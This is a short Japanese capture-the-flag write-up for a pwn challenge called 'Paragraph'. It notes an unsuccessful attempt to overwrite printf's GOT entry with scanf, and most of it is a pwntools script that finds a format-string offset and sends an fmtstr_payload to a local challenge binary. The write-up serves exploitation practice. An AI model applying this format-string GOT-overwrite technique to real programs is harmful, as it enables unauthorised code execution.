---
title: "Paragraph"
points: N/A
tags: ["pwn"]
---

PIEが無効であるため、GOT Overwriteを通じてprintfをscanfにしようとしたがうまくいかず。
原因の特定ができなかったので諦め。いつかやる。

```python
from pwn import *

context.arch = "amd64"

elf = ELF("./chall")

def get_offset():
    for i in range(0, 15):
        r = process("./chall", level="error")
        r.recv()
        r.sendline(b"AAAA" + b".%%%d$x"%i)
        v = r.recv()
        if str(v).find("41414141") != -1:
            return i
    raise Exception("failed to get offset")
offset = get_offset()

r = process("./chall", level="info")
gdbscript = '''
b *main
'''
gdb.attach(r, gdbscript=gdbscript)

r.recv()
r.sendline(fmtstr_payload(offset, writes={elf.got["printf"]:elf.got["__isoc99_scanf"]}, write_size='long')[:-5])
r.interactive()
```